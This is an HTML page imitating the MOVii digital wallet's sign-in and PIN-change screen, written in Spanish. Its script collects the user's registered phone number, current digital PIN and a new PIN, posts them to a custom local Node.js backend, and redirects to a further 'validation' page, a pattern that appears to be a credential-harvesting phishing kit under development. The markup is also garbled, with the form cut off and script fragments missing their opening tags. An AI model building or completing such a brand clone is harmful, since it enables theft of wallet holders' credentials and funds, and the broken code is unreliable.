<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>MOVii · Cambiar clave</title>
<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
<style>
:root{--rosa:#d81b5d;--rosa-osc:#b5154c;--navy:#160c4b;--gris:#f8f8f8;--pill:#edecfc;--borde:#d9d7ee;--error:#c4143f;--ok:#1b7a4b}
*{box-sizing:border-box;margin:0}
body{font-family:'Poppins','Segoe UI',system-ui,sans-serif;background:var(--gris);color:var(--navy);min-height:100vh;display:flex;flex-direction:column}
header{background:#fff;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 0 #eee}
header img{height:46px}
.dots{width:44px;height:44px;border-radius:50%;background:var(--rosa);display:grid;place-items:center}
.dots i{display:block;width:4px;height:4px;border-radius:50%;background:#fff;box-shadow:8px 0 #fff,-8px 0 #fff,0 8px #fff,8px 8px #fff,-8px 8px #fff,0 -8px #fff,8px -8px #fff,-8px -8px #fff}
main{flex:1;width:100%;max-width:440px;margin:0 auto;padding:28px 20px 40px}
.paso{font-size:.8rem;font-weight:600;color:var(--rosa);letter-spacing:.08em;text-transform:uppercase;margin-bottom:8px}
h1{font-size:1.9rem;line-height:1.2;font-weight:500;color:var(--rosa);margin-bottom:12px}
.sub{font-size:1rem;line-height:1.55;margin-bottom:26px}
form{display:flex;flex-direction:column;gap:18px}
label{display:block;font-size:.88rem;font-weight:600;margin-bottom:6px}
input{width:100%;font:inherit;font-size:1.05rem;color:var(--navy);background:#fff;border:1.5px solid var(--borde);border-radius:14px;padding:14px 16px;outline:none;transition:border-color .15s,box-shadow .15s}
input::placeholder{color:#a9a6c8}
input:focus{border-color:var(--rosa);box-shadow:0 0 0 4px rgba(216,27,93,.14)}
input.pin{letter-spacing:.55em;text-align:center;font-weight:600}
input.bad{border-color:var(--error)}
.err{display:none;font-size:.8rem;color:var(--error);margin-top:5px}
.bad+.err{display:block}
.btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;border:0;cursor:pointer;font:inherit;font-weight:500;font-size:1.05rem;padding:15px 20px;border-radius:999px;background:var(--rosa);color:#fff;margin-top:6px;transition:background .15s,transform .1s}
.btn:hover{background:var(--rosa-osc)}.btn:active{transform:scale(.98)}
.btn .arr{width:34px;height:34px;border-radius:50%;background:rgba(255,255,255,.2);display:grid;place-items:center;font-size:1.1rem}
.btn.sec{background:var(--pill);color:var(--navy)}.btn.sec:hover{background:#dedcf6}
.msg{display:none;padding:14px 16px;border-radius:14px;font-size:.92rem;line-height:1.45;margin-top:4px}
.msg.show{display:block}.msg.ok{background:#e4f5ec;color:var(--ok)}.msg.no{background:#fde6ec;color:var(--error)}
.ayuda{text-align:center;font-size:.85rem;margin-top:22px}
.ayuda a{color:var(--rosa);font-weight:600;text-decoration:none}
.bar{height:5px;border-radius:3px;background:var(--pill);margin-bottom:22px;overflow:hidden}.bar b{display:block;height:100%;background:var(--rosa);border-radius:3px}
</style></head><body>

<h1>Ingresa a tu cuenta MOVii</h1>
<p class="sub">Escribe tu número de celular registrado, tu clave digital actual y la nueva clave de 4 dígitos.</p>
<form id="f" novalidate>
 <div><label for="cel">Número de celular registrado</label>

    e.target.classList.remove('bad');
}));

// Evento cuando se envía el formulario

    // Validaciones visuales locales
    const r=[
        bad('cel', !/^3\d{9}$/.test($('cel').value)),
        bad('clave', !/^\d{4}$/.test($('clave').value)),
        bad('nueva', !/^\d{4}$/.test($('nueva').value) || $('nueva').value === $('clave').value)
    ];
    
    // Si alguna validación local dio error, detenemos el proceso
    if(r.some(Boolean)) return;

    // =======================================================
    // NUEVO: CONEXIÓN FETCH CON TU SERVIDOR NODE.JS
    // =======================================================
    try {
        const respuesta = await fetch('http://localhost:3000/api/cambiarClave', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json' // Le avisa a Express que va un JSON
            },
            body: JSON.stringify({
                cel: $('cel').value,
                clave: $('clave').value,
                nueva: $('nueva').value
            })
        });

        const datos = await respuesta.json();

        if (!respuesta.ok) {
            // Si el backend responde con un error (ej: Clave anterior incorrecta o Status 400/500)
            alert(datos.message || "Error al procesar la solicitud");
            return;
        }

        // Si el backend responde exitosamente (Status 200)
        console.log("Servidor responde:", datos);
        
        // Guardamos en sesión que el proceso con el backend fue exitoso
        sessionStorage.setItem('movii', JSON.stringify({ cel: $('cel').value, nueva: $('nueva').value }));
        
        // Redirigimos a la siguiente interfaz de validación v2
        location.href = 'movii-validacion_v2.html';

    } catch (error) {
        console.error("Error de conexión de red:", error);
        alert("No se pudo conectar con el servidor backend. ¿Está encendido?");
    }
});
</script>


</body></html>
